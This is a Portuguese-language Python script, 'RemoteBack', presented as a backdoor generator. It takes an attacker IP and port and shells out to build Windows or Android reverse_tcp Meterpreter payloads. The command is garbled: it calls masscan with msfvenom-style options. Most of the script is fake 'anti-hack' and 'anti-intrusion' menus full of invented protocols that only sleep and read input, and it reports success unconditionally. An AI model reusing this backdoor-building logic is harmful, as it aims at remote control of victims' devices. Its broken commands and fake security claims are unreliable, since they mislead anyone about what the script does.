#!/usr/bin/python
import socket

# -- coding-- utf-8
import sys
import os

def banner():
     print('''


█▀█ █▀▀ █▀▄▀█ █▀█ ▀█▀ █▀▀ █▄▄ ▄▀█ █▀▀ █▄▀
█▀▄ ██▄ █░▀░█ █▄█ ░█░ ██▄ █▄█ █▀█ █▄▄ █░█
         ''')
banner()
os.system("sleep 1")

print("""

================GERADOR BACKDOOR=================
[ 1 ] Windows
[ 2 ] Android
=================================================

=============GERADOR OBFUSCAÇÃO==================

[ 1 ] remoteback.py
[ 2 ] asuna.py
[ 3 ] kirito.py

""")

opção = int(input("Digite a opção que deseja: "))
os.system("sleep 1")

ip = input("Digite o seu ip:")
os.system("sleep 1 ")

port = input("Digite a porta, Recomendado: 54321: ")
os.system("sleep 1")

nome = input("Digite o nome do seu backdoor: ")
os.system("sleep 1")

if opção == 1:
         os.system(f"masscan -p windows/meterpreter/reverse_tcp -f exe LHOST={ip} LPORT={port} > R {nome}.exe")

elif opção == 2:
         os.system(f"masscan -p android/meterpreter/reverse_tcp -f apk LHOST={ip} LPORT={port} > R {nome}.apk")
else:
         print("Opção inválida, escolha outra opção")

os.system("sleep 1")
os.system("clear")

print("[=                     ]")
os.system("sleep 1")
os.system("clear")
print("[===                   ]")
os.system("sleep 1")
os.system("clear")
print("[===========           ]")
os.system("sleep 1")
os.system("clear")
print("[=================     ]")
os.system("sleep 1")
os.system("clear")
print("[======================]")


('''
============GERADOR BACKDOOR==========
''')

('''
[ 1 ] remoteback.py
[ 2 ] asuna.py
[ 3 ] kirito.py
''')

opção = int(input("Digite a opção que deseja:"))
os.system("sleep 1")

obfuscator = input("Digite o nome e numero do arquivo que deseja obfuscar:")
os.system("sleep 1")

encryptor = input("Digite o nome e numero do arquivo que deseja encriptar:")
os.system("sleep 1")

remove = input("Digite o nome e numero do arquivo que deseja remover:")
os.system("sleep 1")

('''
=========GERADOR ANTIHACK/ANTIVIRAL==========
''')

('''
[ 1 ] Anti Invasão Por Portas
[ 2 ] Anti Ataque Hacker
[ 3 ] Bloqueador De Entradas Não Autorizadas
[ 4 ] Ativador De Sistemas Anti-Hack
[ 5 ] Sistemas De Ataque Para Derrubar Virus De Computador
[ 6 ] Inicializador De Protocolos Antivirais
''')

opção = int(input("Digite a opção que deseja:"))
os.system("sleep 1")

antihack = input("Digite as opções que desejar:")
os.system("sleep 1")
os.system("sleep 2")
os.system("sleep 3")
os.system("sleep 4")
os.system("sleep 5")
os.system("sleep 6")

antiviral = input("Digite as opções que desejar:")
os.system("sleep 1")
os.system("sleep 2")
os.system("sleep 3")
os.system("sleep 4")
os.system("sleep 5")
os.system("sleep 6")

('''
=========GERADOR ANTIINTRUSÂO/ANTIINVASÕES=========
''')

('''
[ 1 ] Inicializador De Sistema Anti Intrusão Hacker
[ 2 ] Executar Protocolo Anti Intrusão - Protocolo de Execução 427
[ 3 ] Executar Permissões De Administrador Raiz (Root)
[ 4 ] Ativar Subsequencia De Autodefesas - Código de Segurança 689
[ 5 ] Fechar Redes Portas De Redes Externas & Ativação De Firewall/Antivirus - Código 823
[ 6 ] Passar Canais 0x00iirq (Canal Aberto) Para Canais 1x11iirq (Canal Fechado)

''')

opção = int(input("Digite aqui as opções que deseja:"))
os.system("sleep 1")
os.system("sleep 2")
os.system("sleep 3")
os.system("sleep 4")
os.system("sleep 5")
os.system("sleep 6")

antiintrusão = input("Digite aqui as opções que desejar:")
os.system("sleep 1")
os.system("sleep 2")
os.system("sleep 3")
os.system("sleep 4")
os.system("sleep 5")
os.system("sleep 6")

antiinvasões = input("Digite aqui as opções que desejar:")
os.system("sleep 1")
os.system("sleep 2")
os.system("sleep 3")
os.system("sleep 4")
os.system("sleep 5")
os.system("sleep 6")

('''

========GERADOR ANTIVULNERABILIDADES========

''')

('''

[ 1 ] Ativar Protocolo Anti Vulnerabilidades
[ 2 ] Adicionar Defesas Anti Falhas De Sistemas
[ 3 ] Adicionar Linhas De Segurança E Integridade
[ 4 ] Instalar Inicializador De Protocolo Anti-Falhas
[ 5 ] Inicializar Varreduras Por Falhas E Vulnerabilidades
[ 6 ] Instalar Protocolos de Auto-Segurança

''')

opção = int(input("Digite a opção que deseja:"))
os.system("sleep 1")

antivulnerabilidades = input("Digite o numero e opção que desejar:")
os.system("sleep 1")

print("BACKDOOR CRIADO COM SUCESSO!")
